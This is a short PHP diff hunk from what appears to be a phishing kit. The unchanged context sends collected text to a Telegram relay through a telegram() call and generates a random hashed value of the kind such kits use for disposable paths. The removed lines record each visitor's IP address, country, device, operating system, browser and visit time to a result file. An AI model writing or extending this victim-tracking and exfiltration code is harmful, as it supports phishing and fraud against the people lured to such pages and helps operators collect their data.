@@ -416,18 +416,6 @@
 
     telegram($text);
 
-    // Save Data In Document Text :
-    $text_to_result = "👥========= VISIT =========👥\r\n" .
-    "📍IP - ".get_client_ip()."\t\t | \t\t".
-    $geoplugin->countryCode ."\r\n".
-    "💻 DEVICE = " .UserInfo::get_device()."\r\n".
-    "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
-    "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
-    "DATE AND TIME = ". $present_time ."\r\n";
-    $file = fopen("../result_file/result.txt", "a");
-    fwrite($file, $text_to_result. "\n");
-    fclose($file);
-
     $random=rand(0,100000000000);$md5=md5("$random");$base=base64_encode($md5);$dst=md5("$base");
 
     exit;
